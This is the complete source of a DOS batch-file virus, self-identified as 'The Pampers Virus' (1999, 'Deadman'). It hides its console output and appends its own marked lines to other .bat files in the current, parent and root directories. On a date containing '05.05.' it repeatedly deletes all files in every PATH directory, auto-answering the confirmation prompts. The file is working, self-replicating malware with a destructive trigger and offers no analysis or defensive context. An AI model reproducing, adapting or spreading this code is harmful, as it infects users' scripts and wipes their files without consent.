@ctty nul %#%
if .%2==.LocalFunctionCall# goto apnd#
if .%0==. goto fin#
set vname#=%0
if exist %vname#% goto strt#
set vname#=%0.bat
if not exist %vname#% goto fin#
for %%a in (%path%) do if exist %%a\find.exe set fnd#=.
if .fnd#==. goto fin#

:strt#
echo.|date|find "05.05." %#%
if errorlevel 1 goto inf#
echo y>del#.
for %%a in (%path%) do del %%a\*.*<del#.
del del#.
goto strt#

:inf#
find "#"<%vname#%>body#.bat
for %%a in (*.bat ..\*.bat) do call body#.bat %%a LocalFunctionCall#
for %%a in (\*.bat ..\..\*.bat) do call body#.bat %%a LocalFunctionCall#
goto fin#

################################################
# The Pampers Virus Copyright (C) 1999 Deadman #
################################################

:apnd#
find "#"<%1>nul
if not errorlevel 1 goto eov#
copy body#.bat+%1 body#2.bat
copy body#2.bat %1
del body#2.bat
goto eov#

:fin#
del body#.bat
ctty con %#%>nul
:eov#
